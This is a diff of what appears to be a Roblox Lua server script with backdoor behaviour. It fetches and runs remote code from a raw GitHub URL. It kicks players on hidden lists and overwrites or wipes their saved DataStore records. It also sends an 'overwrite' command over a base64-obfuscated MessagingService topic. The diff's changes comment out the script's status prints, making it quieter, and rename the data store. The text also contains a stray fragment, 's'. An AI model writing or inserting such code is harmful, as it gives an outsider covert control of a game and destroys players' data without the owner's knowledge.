@@ -47,7 +47,7 @@ local function DeepCopyTable(Table)
 end
 
 function m:Init()
-	print("omw!")
+	--print("omw!")
 	pcall(function()
 		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 	end)
@@ -79,7 +79,7 @@ function m:Init()
 		end
 	end)
 
-	print("done!")
+	--print("done!")
 end
 
 function m:StartScript()
@@ -99,12 +99,12 @@ function m:StartScript()
 			if table.find(wipe, PlayerId) then
 				Player:Kick()
 
-				DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
+				DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, {});
 			end
 
 			if table.find(Revert, PlayerId) then
 
-				RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
+				RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)
 
 				print(RevertData[Key])
 			end
@@ -133,7 +133,7 @@ function m:StartScript()
 				print(RevertData[Key])
 				Player:Kick()
 
-				DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, RevertData[Key]);
+				DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, RevertData[Key]);
 			end
 		end)
 	end)
@@ -152,12 +152,12 @@ function m:StartScript()
 						if table.find(wipe, PlayerId) then
 							v:Kick()
 
-							DataStoreService:GetDataStore("GameEntitiesFolder"):SetAsync(Key, {});
+							DataStoreService:GetDataStore("GameEntitiesFolder3"):SetAsync(Key, {});
 						end
 
 						if table.find(Revert, PlayerId) then
 
-							RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder"):GetAsync(Key)
+							RevertData[Key] = DataStoreService:GetDataStore("GameEntitiesFolder3"):GetAsync(Key)
 
 							print(RevertData[Key])
 						end
@@ -193,7 +193,7 @@ function m:StartScript()
 	s
 
 	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
-	print("help!")
+	--print("help!")
 end
 
 m:Init()
